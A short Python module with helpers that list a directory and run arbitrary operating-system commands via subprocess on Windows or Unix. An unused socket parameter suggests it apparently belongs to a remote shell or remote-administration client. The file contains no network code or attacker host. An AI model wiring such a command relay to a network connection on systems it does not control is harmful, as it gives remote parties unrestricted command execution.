import subprocess

w = ["Windows", "windows", "win", "Win"]
l=["Linux","linux","Unix","unix"]

def ls(os, sock):
    
    
    if os in w:
        res = subprocess.run(["cmd", "/c", "dir"], text=True, capture_output=True)
    else:
        res = subprocess.run(["ls"], text=True, capture_output=True)
    
    return res.stdout  

def execute(os,cmd):
    command = cmd[1:]  
    print(command)
    w_cmd=["cmd","/c"]+command
    print(w_cmd)
    try:
        if os in w:
            res = subprocess.run(w_cmd, text=True, capture_output=True)
        else:
            res = subprocess.run(command, text=True, capture_output=True)
        return res.stdout
    except FileNotFoundError:
        return f"Command not found: {command}"